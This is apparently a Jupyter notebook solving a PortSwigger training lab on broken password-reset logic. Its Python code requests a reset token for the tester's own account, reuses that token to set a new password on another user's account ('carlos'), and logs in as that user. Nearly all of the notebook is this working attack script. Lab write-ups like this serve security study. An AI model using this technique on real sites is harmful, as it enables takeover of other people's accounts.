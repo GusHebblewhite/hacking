{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "893bfe58",
   "metadata": {},
   "source": [
    "# Other - Password Reset Broken Logic\n",
    "[Lab is here](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "fbe3c8cb",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "from load_un_pw import get_un_pw"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "edc41e86",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://ac941f0b1edfa619c02912bf00460094.web-security-academy.net/\"\n",
    "new_password = \"test\"\n",
    "target_username = \"carlos\"\n",
    "\n",
    "#Step 1: Generate a token for myself\n",
    "requests.post(URL + \"forgot-password\", data={\"username\" : \"wiener\"})\n",
    "\n",
    "#Step 2. Grab token from email\n",
    "token = {\"temp-forgot-password-token\" : \"aVpb5xpqzW7tIUJKdocOzWFh1z4LN4kQ\"}\n",
    "\n",
    "#Step 3. Attempt reset with different username\n",
    "r1 = requests.post(\n",
    "    URL + f\"forgot-password?temp-forgot-password-token={token['temp-forgot-password-token']}\",\n",
    "    data = token | {\"username\" : target_username, \"new-password-1\" : new_password, \"new-password-2\" : new_password})\n",
    "\n",
    "#Step 4. Login\n",
    "r2 = requests.post(URL + \"login\", data = {\"username\" : target_username, \"password\" : new_password})\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b4b72b4",
   "metadata": {},
   "source": [
    "Success!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6d594f5d",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
